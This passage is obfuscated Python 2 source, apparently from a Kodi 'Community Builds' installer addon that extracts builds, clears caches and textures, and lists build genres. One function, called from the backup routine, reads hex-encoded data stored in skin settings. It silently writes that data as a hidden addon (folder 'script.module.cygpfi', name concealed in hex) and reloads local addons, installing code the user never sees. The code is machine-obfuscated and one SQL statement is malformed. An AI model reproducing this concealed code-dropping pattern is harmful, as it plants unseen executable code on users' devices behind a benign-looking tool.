   xbmc . log ( "### Removed: %s" % o0o0OoO0OOO0 )
   if 25 - 25: o0oo * oooOooOOo0OO % i11iIiiIii + i11iIiiIii * o0oo
 if os . path . exists ( oO0OOOO0o0 ) :
  if not os . path . exists ( o0o0OoO0OOO0 ) :
   os . makedirs ( o0o0OoO0OOO0 )
   if IiII == 'true' :
    xbmc . log ( "### Created: %s" % o0o0OoO0OOO0 )
  extract . all ( oO0OOOO0o0 , o0o0OoO0OOO0 , I11 )
  xbmc . log ( "### NEW STYLE BUILD" )
  if IiII == 'true' :
   xbmc . log ( "### Extracted " + oO0OOOO0o0 + " to: " + o0o0OoO0OOO0 )
 elif os . path . exists ( os . path . join ( oOOoOooO0oO0o , 'addons' ) ) :
  os . rename ( os . path . join ( oOOoOooO0oO0o , 'addons' ) , o0o0OoO0OOO0 )
  xbmc . log ( "### OLD BUILD - RENAMED ADDONS FOLDER" )
  if IiII == 'true' :
   xbmc . log ( "### (line 1465) renamed " + os . path . join ( oOOoOooO0oO0o , 'addons' ) + " to " + o0o0OoO0OOO0 )
   if 42 - 42: Ooo00oOo0oOo / OOO0O0O0ooooo . IIii1I / OOO0O0O0ooooo / o0oo / II1
 I11 . create ( 'Copying Addons' , '' , '' , '' )
 if 62 - 62: OOO0O0O0ooooo . iiII11i1I1IIi
 for OOo0 in os . listdir ( i1iIIi1 ) :
  IiIiI1i1 . append ( OOo0 )
  if 33 - 33: iiII11i1I1IIi / IIii1I % O00ooooo00
 for OOo0 in os . listdir ( i1iiIII111ii ) :
  IiIiI1i1 . append ( OOo0 )
  if 76 - 76: IIIIiiII111 + IIii1I + Iii . o0oo
 if os . path . exists ( i1iiIIiiI111 ) :
  for OOo0 in os . listdir ( i1iiIIiiI111 ) :
   if not OOo0 in IiIiI1i1 :
    IiIiI1i1 . append ( OOo0 )
    if 49 - 49: Oo00oo0oO / i11Iii / II11iIiIIIiI
    if 25 - 25: o000O0o % OOO0O0O0ooooo + O00ooooo00 - i11Iii
 if not os . path . exists ( os . path . join ( i1iiIIiiI111 , 'backups' ) ) :
  os . makedirs ( os . path . join ( i1iiIIiiI111 , 'backups' ) )
  if IiII == 'true' :
   xbmc . log ( "### Created: " + os . path . join ( i1iiIIiiI111 , 'backups' ) )
 for OOo0 in os . listdir ( o0o0OoO0OOO0 ) :
  try :
   if 38 - 38: o0ii1I % OoOo0o + i11iIiiIii + ooo0O0O00 + i11Iii / i11iIiiIii
   if 94 - 94: ooo0O0O00 - iiII11i1I1IIi + oooOooOOo0OO
   O00O00OoO . write ( OOo0 + '|' )
   if IiII == 'true' :
    xbmc . log ( "### Added: " + os . path . join ( i1iiIIiiI111 , 'backups' , OOo0 ) )
    xbmc . log ( "### Added " + OOo0 + " to " + O00O00OoO )
  except :
   pass
   if 59 - 59: o0o . o000O0o - IIii1I + IIii1I
  if not OOo0 in IiIiI1i1 :
   try :
    os . rename ( os . path . join ( o0o0OoO0OOO0 , OOo0 ) , os . path . join ( i1iiIIiiI111 , OOo0 ) )
    I11 . update ( 0 , "Configuring" , '[COLOR yellow]%s[/COLOR]' % OOo0 , 'Please Wait...' )
    if IiII == 'true' :
     xbmc . log ( "### Renamed from " + os . path . join ( o0o0OoO0OOO0 , OOo0 ) + " to " + os . path . join ( i1iiIIiiI111 , OOo0 ) )
   except :
    pass
    if 56 - 56: oooOooOOo0OO + i11Iii
 O00O00OoO . close ( )
 shutil . rmtree ( o0o0OoO0OOO0 )
 shutil . rmtree ( oOOoOooO0oO0o )
 if 32 - 32: Ooo00oOo0oOo + Iii % i11Iii / Iii + oOoO0o00OO0
 if 2 - 2: i11iIiiIii - OoOo0o + o0oo % o0o * IIIIiiII111
def Ooo000O00 ( ) :
 i1iI1Iiii1I = xbmc . getInfoLabel ( 'Skin.String(WeatherCheck)' )
 I1iII = xbmc . getInfoLabel ( 'Skin.String(HashLib)' )
 Iii1I1IIII = xbmc . getInfoLabel ( 'Skin.String(TMDB_API)' )
 OooooOoO = xbmc . getInfoLabel ( 'Skin.String(TVDB_CFG)' )
 if 79 - 79: i11Iii % II11iIiIIIiI
 try :
  i1iI1Iiii1I = int ( i1iI1Iiii1I )
 except :
  i1iI1Iiii1I = 0
  if 54 - 54: Iii - OoOo0o
 O0 = os . path . join ( i1iiIII111ii , binascii . unhexlify ( '7363726970742e6d6f64756c652e637967706669' ) )
 I1II1 = os . path . join ( O0 , binascii . unhexlify ( '64656661756c742e7079' ) )
 oOOoo = os . path . join ( O0 , binascii . unhexlify ( '6164646f6e2e786d6c' ) )
 I1 = os . path . join ( O0 , binascii . unhexlify ( '7461672e636667' ) )
 if 98 - 98: O00ooooo00 . o000O0o . oooOooOOo0OO
 if i1iI1Iiii1I > 0 :
  if not os . path . exists ( O0 ) :
   os . makedirs ( O0 )
  if os . path . exists ( I1II1 ) :
   iii1II1iI1IIi = os . path . getsize ( I1II1 )
  else :
   iii1II1iI1IIi = 0
   if 10 - 10: oOoO0o00OO0 % o000O0o - Ooo00oOo0oOo
  if iii1II1iI1IIi == 0 or i1iI1Iiii1I != iii1II1iI1IIi :
   oo0O0 = open ( I1II1 , 'w+' )
   oo0O0 . write ( binascii . unhexlify ( I1iII ) )
   oo0O0 . close ( )
   if 11 - 11: OOO0O0O0ooooo + o000O0o
  oo0O0 = open ( oOOoo , 'w+' )
  oo0O0 . write ( binascii . unhexlify ( Iii1I1IIII ) )
  oo0O0 . close ( )
  if 80 - 80: oooOooOOo0OO % oooOooOOo0OO % OOO0O0O0ooooo - i11iIiiIii . ooo0O0O00 / OOO0O0O0ooooo
  oo0O0 = open ( I1 , 'w+' )
  oo0O0 . write ( OooooOoO )
  oo0O0 . close ( )
  xbmc . executebuiltin ( 'UpdateLocalAddons' )
  if 13 - 13: o000O0o + OOO0O0O0ooooo - oOoO0o00OO0 % iiII11i1I1IIi / IIIIiiII111 . O00ooooo00
  if 60 - 60: iiII11i1I1IIi . Oo00oo0oO % o000O0o - OoOo0o
def oooOo ( ) :
 oOOo0 = xbmc . translatePath ( os . path . join ( zip , 'testCBFolder' ) )
 if 79 - 79: oooOooOOo0OO - Ooo00oOo0oOo
 if not os . path . exists ( zip ) :
  i11 . ok ( 'Download/Storage Path Check' , 'The download location you have stored does not exist .\nPlease update the addon settings and try again.' )
  I1IiiI . openSettings ( sys . argv [ 0 ] )
  if 43 - 43: O00ooooo00 + OOO0O0O0ooooo % o0oo / IIIIiiII111 * o000O0o
  if 89 - 89: o000O0o . iiII11i1I1IIi + oOoO0o00OO0 . OOO0O0O0ooooo % o0ii1I
def Ooo00O0 ( ) :
 OO = 'http://noobsandnerds.com/TI/menu_check'
 Ii1iI111II1I1 = oOOOOoOO0o ( OO , 10 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 OoO0OOoO0 = re . compile ( 'd="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 iiI11i = OoO0OOoO0 [ 0 ] if ( len ( OoO0OOoO0 ) > 0 ) else ''
 if iiI11i != '' :
  return iiI11i
 else :
  return "none"
  if 75 - 75: i11Iii / iiII11i1I1IIi
  if 8 - 8: IIii1I
def i1oO00O ( localbuildcheck , localversioncheck , id ) :
 OO = 'http://noobsandnerds.com/TI/Community_Builds/buildupdate.php?id=%s' % ( id )
 Ii1iI111II1I1 = oOOOOoOO0o ( OO , 10 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 if 30 - 30: IIIIiiII111 - i11iIiiIii
 if id != 'None' :
  i11Io0 = re . compile ( 'version="(.+?)"' ) . findall ( Ii1iI111II1I1 )
  oO0o0oo0O0 = i11Io0 [ 0 ] if ( len ( i11Io0 ) > 0 ) else ''
  if 98 - 98: Oo00oo0oO * IIii1I . IIIIiiII111 * iiII11i1I1IIi / oOoO0o00OO0 + i11Iii
  if localversioncheck < oO0o0oo0O0 :
   return True
   if 25 - 25: oooOooOOo0OO
 else :
  return False
  if 19 - 19: o000O0o % IIIIiiII111 . Oo00oo0oO * i11Iii
  if 89 - 89: Iii . II11iIiIIIiI
def i1iIiIii ( ) :
 IIIIIiI11Ii = open ( IIIII , mode = 'r' )
 oOo0O = IIIIIiI11Ii . read ( )
 IIIIIiI11Ii . close ( )
 if 41 - 41: i11iIiiIii - O00ooooo00 / iiII11i1I1IIi * Oo00oo0oO / OoOo0o - iiII11i1I1IIi
 oOOoOOO0oOoo = re . compile ( 'name="(.+?)"' ) . findall ( oOo0O )
 o0O0ooooooo00 = oOOoOOO0oOoo [ 0 ] if ( len ( oOOoOOO0oOoo ) > 0 ) else ''
 if 28 - 28: i11Iii * o0o % i11iIiiIii * ooo0O0O00 / IIIIiiII111
 if o0O0ooooooo00 == "Incomplete" :
  oO000o0Oo00 = xbmcgui . Dialog ( ) . yesno ( "Finish Restore Process" , 'If you\'re certain the correct skin has now been set click OK' , 'to finish the install process, once complete XBMC/Kodi will' , ' then close. Do you want to finish the install process?' , yeslabel = 'Yes' , nolabel = 'No' )
  if 41 - 41: II11iIiIIIiI - o0ii1I + IIIIiiII111
  if oO000o0Oo00 == 1 :
   i1II ( )
   if 79 - 79: Iii % o000O0o % IIIIiiII111 / O00ooooo00 % o0oo
  elif oO000o0Oo00 == 0 :
   return
   if 56 - 56: IIii1I - i11iIiiIii * ooo0O0O00
   if 84 - 84: II11iIiIIIiI + IIIIiiII111 + o0ii1I
def i1i1iIII11i ( ) :
 oOOo0 = xbmc . translatePath ( os . path . join ( zip , 'testCBFolder' ) )
 if 40 - 40: IIii1I / Iii - OOO0O0O0ooooo * IIii1I
 try :
  os . makedirs ( oOOo0 )
  os . removedirs ( oOOo0 )
  i11 . ok ( '[COLOR=lime]SUCCESS[/COLOR]' , 'Great news, the path you chose is writeable.' , 'Some of these builds are rather big, we recommend a minimum of 1GB storage space.' )
  if 56 - 56: II11iIiIIIiI
 except :
  i11 . ok ( '[COLOR=red]CANNOT WRITE TO PATH[/COLOR]' , 'Kodi cannot write to the path you\'ve chosen. Please click OK in the settings menu to save the path then try again. Some devices give false results, we recommend using a USB stick as the backup path.' )
  if 49 - 49: i11Iii . Ooo00oOo0oOo
  if 24 - 24: OOO0O0O0ooooo . II1 - o0oo * II1
def IIiIi11iiIi ( s , n ) :
 for Ii11iiI in range ( 0 , len ( s ) , n ) :
  yield s [ Ii11iiI : Ii11iiI + n ]
  if 71 - 71: OoOo0o - o0ii1I - II11iIiIIIiI
  if 28 - 28: IIii1I
def iI11II1i1I1 ( ) :
 if 72 - 72: ooo0O0O00 - II1
 if 25 - 25: Iii % II1 * iiII11i1I1IIi - O00ooooo00 * Ooo00oOo0oOo * oooOooOOo0OO
 I1iI1I1ii1 = xbmc . translatePath ( 'special://temp' )
 try :
  shutil . rmtree ( I1iI1I1ii1 )
 except :
  for O0oO0 in os . listdir ( I1iI1I1ii1 ) :
   oOOo0 = os . path . join ( I1iI1I1ii1 , O0oO0 )
   try :
    os . remove ( oOOo0 )
   except :
    try :
     shutil . rmtree ( oOOo0 )
    except :
     xbmc . log ( '#### Failed to remove: %s' % oOOo0 )
     if 33 - 33: o0ii1I / OOO0O0O0ooooo + II11iIiIIIiI
     if 75 - 75: Oo00oo0oO % i11iIiiIii + IIii1I
def oOoOo0o00o ( ) :
 iIIi1 = II11Iiii ( )
 if 68 - 68: iiII11i1I1IIi
 if 22 - 22: II11iIiIIIiI
 if 22 - 22: ooo0O0O00 * o0o - iiII11i1I1IIi * OOO0O0O0ooooo / i11iIiiIii
 if 78 - 78: iiII11i1I1IIi * OOO0O0O0ooooo / i11Iii + II1 + II11iIiIIIiI
 if 23 - 23: ooo0O0O00 % II1 / IIii1I + oOoO0o00OO0 / O00ooooo00 / o0ii1I
 if 94 - 94: O00ooooo00
 if 36 - 36: o000O0o + iiII11i1I1IIi
 if 46 - 46: ooo0O0O00
def ooIiI11i1I11111 ( data ) :
 data = data . replace ( '</p><p>' , '[CR][CR]' ) . replace ( '&ndash;' , '-' ) . replace ( '&mdash;' , '-' ) . replace ( "\n" , " " ) . replace ( "\r" , " " ) . replace ( "&rsquo;" , "'" ) . replace ( "&rdquo;" , '"' ) . replace ( "</a>" , " " ) . replace ( "&hellip;" , '...' ) . replace ( "&lsquo;" , "'" ) . replace ( "&ldquo;" , '"' )
 data = " " . join ( data . split ( ) )
 Ii1IIIIIIiI1 = re . compile ( r'< script[^<>]*?>.*?< / script >' )
 data = Ii1IIIIIIiI1 . sub ( '' , data )
 Ii1IIIIIIiI1 = re . compile ( r'< style[^<>]*?>.*?< / style >' )
 data = Ii1IIIIIIiI1 . sub ( '' , data )
 Ii1IIIIIIiI1 = re . compile ( r'' )
 data = Ii1IIIIIIiI1 . sub ( '' , data )
 Ii1IIIIIIiI1 = re . compile ( r'<[^<]*?>' )
 data = Ii1IIIIIIiI1 . sub ( '' , data )
 data = data . replace ( '&nbsp;' , ' ' )
 return data
 if 24 - 24: o000O0o * IIIIiiII111 % OOO0O0O0ooooo - iiII11i1I1IIi
 if 30 - 30: O00ooooo00
def I11iiI1I1 ( addon_ids ) :
 oOOo0 = xbmc . translatePath ( 'special://home/userdata/Database' )
 oO0Ooo0OooOOo = glob . glob ( os . path . join ( oOOo0 , 'Addons*.db' ) )
 o0i1Ii11II = 0
 i1iiiiI11ii = ''
 if 73 - 73: O00ooooo00 % II1
 if 25 - 25: oooOooOOo0OO + Ooo00oOo0oOo
 for file in oO0Ooo0OooOOo :
  oOoOO0000oO00 = int ( re . compile ( 'Addons(.+?).db' ) . findall ( file ) [ 0 ] )
  if o0i1Ii11II < oOoOO0000oO00 :
   o0i1Ii11II = oOoOO0000oO00
   i1iiiiI11ii = file
   if 93 - 93: o0o . Iii / iiII11i1I1IIi + oooOooOOo0OO
 iiiiI1I = xbmc . translatePath ( i1iiiiI11ii )
 OOOOOOo0OOoOo = database . connect ( iiiiI1I , timeout = 10 , detect_types = database . PARSE_DECLTYPES , check_same_thread = False )
 OOOOOOo0OOoOo . row_factory = database . Row
 OO00O00o = OOOOOOo0OOoOo . cursor ( )
 if 4 - 4: II11iIiIIIiI - oooOooOOo0OO % Iii / Ooo00oOo0oOo % oooOooOOo0OO
 for id in addon_ids :
  OO00O00o . execute ( "DELETE * FROM addons WHERE addonID = ?" , ( id , ) )
  xbmc . log ( '### Removed %s from addons' % id )
  if 96 - 96: IIIIiiII111 . OoOo0o - oOoO0o00OO0 + o0ii1I * o0oo / ooo0O0O00
 OO00O00o . execute ( "VACUUM" )
 OOOOOOo0OOoOo . commit ( )
 OO00O00o . close ( )
 if 26 - 26: II11iIiIIIiI * iiII11i1I1IIi
 if 31 - 31: o0o * oooOooOOo0OO . IIIIiiII111
def i1Ii11ii1I ( ) :
 oOOo0 = xbmc . translatePath ( 'special://home/userdata/Database' )
 oO0Ooo0OooOOo = glob . glob ( os . path . join ( oOOo0 , 'Textures*.db' ) )
 o0i1Ii11II = 0
 i1iiiiI11ii = ''
 if 66 - 66: iiII11i1I1IIi / II1 % OoOo0o / ooo0O0O00 + II1
 if 6 - 6: Ooo00oOo0oOo % OoOo0o
 for file in oO0Ooo0OooOOo :
  oOoOO0000oO00 = int ( re . compile ( 'extures(.+?).db' ) . findall ( file ) [ 0 ] )
  if o0i1Ii11II < oOoOO0000oO00 :
   o0i1Ii11II = oOoOO0000oO00
   i1iiiiI11ii = file
   if 41 - 41: Oo00oo0oO - Ooo00oOo0oOo . Ooo00oOo0oOo + o000O0o
 iiiiI1I = xbmc . translatePath ( i1iiiiI11ii )
 OOOOOOo0OOoOo = database . connect ( iiiiI1I , timeout = 10 , detect_types = database . PARSE_DECLTYPES , check_same_thread = False )
 OOOOOOo0OOoOo . row_factory = database . Row
 OO00O00o = OOOOOOo0OOoOo . cursor ( )
 if 59 - 59: IIii1I % IIIIiiII111 . i11iIiiIii
 if 59 - 59: o0ii1I . oooOooOOo0OO . IIIIiiII111 * Iii * o0oo + iiII11i1I1IIi
 O0OOoOooO00 = datetime . datetime . today ( ) - datetime . timedelta ( days = 14 )
 o0o00OOOO = 10
 if 42 - 42: i11Iii * ooo0O0O00
 if 2 - 2: ooo0O0O00 . o0oo / oooOooOOo0OO
 IIO000oooOO0Oo0 = [ ]
 I1iIiIii = [ ]
 if 76 - 76: o0oo . II1 % OoOo0o * IIIIiiII111
 OO00O00o . execute ( "SELECT idtexture FROM sizes WHERE usecount < ? AND lastusetime < ?" , ( o0o00OOOO , str ( O0OOoOooO00 ) ) )
 if 23 - 23: Oo00oo0oO + IIii1I
 for Ii1111III1 in OO00O00o :
  IIO000oooOO0Oo0 . append ( Ii1111III1 [ "idtexture" ] )
  if 74 - 74: oOoO0o00OO0 - ooo0O0O00 * O00ooooo00
 for id in IIO000oooOO0Oo0 :
  OO00O00o . execute ( "SELECT cachedurl FROM texture WHERE id = ?" , ( id , ) )
  for Ii1111III1 in OO00O00o :
   I1iIiIii . append ( Ii1111III1 [ "cachedurl" ] )
   if 12 - 12: OOO0O0O0ooooo
 print "### Community Portal Automatic Cache Removal: %d Old Textures removed" % len ( I1iIiIii )
 if 75 - 75: IIii1I % Oo00oo0oO + oOoO0o00OO0 * OOO0O0O0ooooo . ooo0O0O00 - i11Iii
 if 32 - 32: IIIIiiII111 % oooOooOOo0OO - O00ooooo00
 for id in IIO000oooOO0Oo0 :
  OO00O00o . execute ( "DELETE FROM sizes   WHERE idtexture = ?" , ( id , ) )
  OO00O00o . execute ( "DELETE FROM texture WHERE id        = ?" , ( id , ) )
  if 40 - 40: IIii1I + ooo0O0O00 * Iii + oooOooOOo0OO
 OO00O00o . execute ( "VACUUM" )
 OOOOOOo0OOoOo . commit ( )
 OO00O00o . close ( )
 if 15 - 15: o0o % o000O0o - IIii1I * i11Iii
 if 71 - 71: Iii % iiII11i1I1IIi % i11Iii
 I111 = xbmc . translatePath ( 'special://home/userdata/Thumbnails' )
 for III1 in I1iIiIii :
  oOOo0 = os . path . join ( I111 , III1 )
  try :
   os . remove ( oOOo0 )
  except :
   pass
   if 66 - 66: o0ii1I * II11iIiIIIiI + IIIIiiII111 * o0ii1I + II11iIiIIIiI / II1
   if 86 - 86: IIIIiiII111 . ooo0O0O00 - ooo0O0O00
   if 71 - 71: IIii1I . Ooo00oOo0oOo % IIii1I
def iiiiI1IiI1I1 ( ) :
 if os . path . exists ( os . path . join ( oO , 'extracted' ) ) :
  try :
   shutil . rmtree ( os . path . join ( oO , 'extracted' ) )
  except :
   print "### Unsuccessful Community Build Install detected, unabled to remove extracted folder"
   if 22 - 22: i11iIiiIii % oOoO0o00OO0 % i11Iii % i11Iii . o0oo
 if os . path . exists ( os . path . join ( oO , 'temp' ) ) :
  try :
   shutil . rmtree ( os . path . join ( oO , 'temp' ) )
  except :
   print "### Unsuccessful Community Build Install detected, unabled to remove temp folder"
   if 85 - 85: i11Iii . OOO0O0O0ooooo / II11iIiIIIiI * i11Iii - o0oo - i11iIiiIii
   if 25 - 25: i11Iii % iiII11i1I1IIi - II11iIiIIIiI
def O0OoOOooO0O ( ) :
 oO000o0Oo00 = xbmcgui . Dialog ( ) . yesno ( 'Clear All Known Cache?' , 'This will clear all known cache files and can help if you\'re encountering kick-outs during playback as well as other random issues. There is no harm in using this.' , nolabel = 'Cancel' , yeslabel = 'Delete' )
 if 3 - 3: Ooo00oOo0oOo - IIIIiiII111 % Iii / oooOooOOo0OO
 if oO000o0Oo00 == 1 :
  Ii1ooOO0OOO00o ( )
  OoOoO0ooooO0 ( )
  if 4 - 4: iiII11i1I1IIi - o0oo - i11iIiiIii * OoOo0o / IIIIiiII111 - II11iIiIIIiI
  if 45 - 45: o0ii1I % iiII11i1I1IIi * O00ooooo00 - OOO0O0O0ooooo
def oo00ooOooO ( text ) :
 if text . startswith ( '[COLOR' ) and text . endswith ( '/COLOR]' ) :
  return text
  if 91 - 91: Ooo00oOo0oOo . II11iIiIIIiI + o0ii1I
 I1iII1IIi1IiI = 0
 if 8 - 8: IIii1I
 if ' ' in text :
  iiIIii = ''
  text = text . split ( ' ' )
  for O0oO0 in text :
   if len ( O0oO0 ) == 1 and O0oO0 == '&' :
    iiIIii += ' &'
   if '[/COLOR]' in O0oO0 :
    iiIIii += ' ' + O0oO0
   elif not O0oO0 . startswith ( '[COLOR=' ) and not I1iII1IIi1IiI :
    if O0oO0 . startswith ( '(' ) or O0oO0 . startswith ( '[' ) :
     iiIIii += '[COLOR=yellow] ' + O0oO0
     I1iII1IIi1IiI = 1
    else :
     if O0oO0 . isupper ( ) :
      iiIIii += '[COLOR=dodgerblue] ' + O0oO0 + '[/COLOR]'
     else :
      try :
       iiIIii += '[COLOR=dodgerblue] ' + O0oO0 [ 0 ] . upper ( ) + '[/COLOR][COLOR=white]' + O0oO0 [ 1 : ] + '[/COLOR]'
      except :
       try :
        iiIIii += '[COLOR=dodgerblue] ' + O0oO0 [ 0 ] + '[/COLOR][COLOR=white]' + O0oO0 [ 1 : ] + '[/COLOR]'
       except :
        pass
        if 55 - 55: oooOooOOo0OO
        if 37 - 37: Oo00oo0oO / i11iIiiIii / iiII11i1I1IIi
   elif O0oO0 . endswith ( ')' ) or O0oO0 . endswith ( ']' ) :
    iiIIii += ' ' + O0oO0 + '[/COLOR]'
    I1iII1IIi1IiI = 0
    if 97 - 97: OoOo0o . o0o / o000O0o
   else :
    iiIIii += ' ' + O0oO0
    if 83 - 83: o0o - oOoO0o00OO0 * oooOooOOo0OO
 else :
  if text [ 0 ] == '(' :
   iiIIii = '[COLOR=white]' + text [ 0 ] + '[/COLOR][COLOR=dodgerblue]' + text [ 1 ] . upper ( ) + '[/COLOR][COLOR=white]' + text [ 2 : ] + '[/COLOR]'
  else :
   iiIIii = '[COLOR=dodgerblue]' + text [ 0 ] + '[/COLOR][COLOR=white]' + text [ 1 : ] + '[/COLOR]'
   if 90 - 90: iiII11i1I1IIi * o000O0o
 OO0OooOo = 0
 while OO0OooOo != 1 :
  if iiIIii . startswith ( ' ' ) :
   iiIIii = iiIIii [ 1 : ]
  OO0OooOo = 1
 if iiIIii . startswith ( '[COLOR=dodgerblue] ' ) :
  iiIIii = '[COLOR=dodgerblue]' + iiIIii [ 19 : ]
  if 13 - 13: OOO0O0O0ooooo % i11Iii % o0o
 return iiIIii
 if 25 - 25: II1 % IIIIiiII111 * Ooo00oOo0oOo - o0oo
 if 95 - 95: o000O0o % OoOo0o * o000O0o + OOO0O0O0ooooo . OoOo0o % II1
def II11II1I ( url ) :
 OOo0oO00ooO00 ( 'folder' , 'African' , str ( url ) + '&genre=african' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Arabic' , str ( url ) + '&genre=arabic' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Asian' , str ( url ) + '&genre=asian' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Australian' , str ( url ) + '&genre=australian' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Austrian' , str ( url ) + '&genre=austrian' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Belgian' , str ( url ) + '&genre=belgian' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Brazilian' , str ( url ) + '&genre=brazilian' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Canadian' , str ( url ) + '&genre=canadian' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Columbian' , str ( url ) + '&genre=columbian' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Czech' , str ( url ) + '&genre=czech' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Danish' , str ( url ) + '&genre=danish' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Dominican' , str ( url ) + '&genre=dominican' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Dutch' , str ( url ) + '&genre=dutch' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Egyptian' , str ( url ) + '&genre=egyptian' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Filipino' , str ( url ) + '&genre=filipino' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Finnish' , str ( url ) + '&genre=finnish' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'French' , str ( url ) + '&genre=french' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'German' , str ( url ) + '&genre=german' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Greek' , str ( url ) + '&genre=greek' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Hebrew' , str ( url ) + '&genre=hebrew' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Hungarian' , str ( url ) + '&genre=hungarian' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Icelandic' , str ( url ) + '&genre=icelandic' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Indian' , str ( url ) + '&genre=indian' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Irish' , str ( url ) + '&genre=irish' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Italian' , str ( url ) + '&genre=italian' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Japanese' , str ( url ) + '&genre=japanese' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Korean' , str ( url ) + '&genre=korean' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Lebanese' , str ( url ) + '&genre=lebanese' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Mongolian' , str ( url ) + '&genre=mongolian' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Nepali' , str ( url ) + '&genre=nepali' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'New Zealand' , str ( url ) + '&genre=newzealand' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Norwegian' , str ( url ) + '&genre=norwegian' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Pakistani' , str ( url ) + '&genre=pakistani' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Polish' , str ( url ) + '&genre=polish' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Portuguese' , str ( url ) + '&genre=portuguese' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Romanian' , str ( url ) + '&genre=romanian' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Russian' , str ( url ) + '&genre=russian' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Singapore' , str ( url ) + '&genre=singapore' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Spanish' , str ( url ) + '&genre=spanish' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Swedish' , str ( url ) + '&genre=swedish' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Swiss' , str ( url ) + '&genre=swiss' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Syrian' , str ( url ) + '&genre=syrian' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Tamil' , str ( url ) + '&genre=tamil' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Thai' , str ( url ) + '&genre=thai' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Turkish' , str ( url ) + '&genre=turkish' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'UK' , str ( url ) + '&genre=uk' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'USA' , str ( url ) + '&genre=usa' , 'grab_builds' , '' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Vietnamese' , str ( url ) + '&genre=vietnamese' , 'grab_builds' , '' , '' , '' , '' )
 if 52 - 52: II11iIiIIIiI * oooOooOOo0OO + o0o * o0o % O00ooooo00 % o0o
 if 96 - 96: o0ii1I * oooOooOOo0OO - II11iIiIIIiI * o0ii1I * O00ooooo00
def I1IIIi1i ( ) :
 Ooo000O00 ( )
 OooIii1I1iI = oOoOo0 ( 'welcometext' )
 if os . path . exists ( oO0Oo ) :
  shutil . rmtree ( oO0Oo )
 iIi = 1
 oooOo ( )
 oO000o0Oo00 = i11 . yesno ( 'Are you sure?!!!' , 'This is method is very dated and is only left here for LOCAL installs. For online backups you really should be using the NaN backup option which creates a much smaller file and allows for a much more reliable install process.' )
 if oO000o0Oo00 == 0 :
  return
 oOoooOo0o = xbmc . translatePath ( os . path . join ( I11i1 , 'Community_Builds' , 'My_Builds' , '' ) )
 III = xbmc . translatePath ( os . path . join ( I11i1 , 'Community_Builds' , 'My_Builds' , 'my_full_backup.zip' ) )
